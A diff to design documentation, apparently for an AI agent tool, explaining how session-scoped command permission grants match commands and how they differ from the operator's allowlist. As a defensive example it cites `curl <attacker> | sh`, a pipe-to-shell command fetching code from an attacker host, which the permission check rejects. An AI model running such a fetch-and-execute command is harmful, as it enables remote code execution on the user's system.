@@ -189,7 +189,7 @@ A backgrounded command goes through the same permission gate as a foreground one
 
 Widening is offered **only** for a single plain invocation. Anything carrying shell metacharacters (`| & ; < > $( ) backtick * ? [ ] { } ! # ~ % @`, a newline) or a leading `VAR=` assignment keeps the narrow grant. `Allow always` keeps its original meaning; the wider grant is never implied.
 
-Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.
+Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps covering any arguments of an entry, and a line of several commands only when each of them is an entry ([Security and trust](../operate/security.md#permission-modes-and-prompts) has its rules).
 
 ## HTTP surface
 
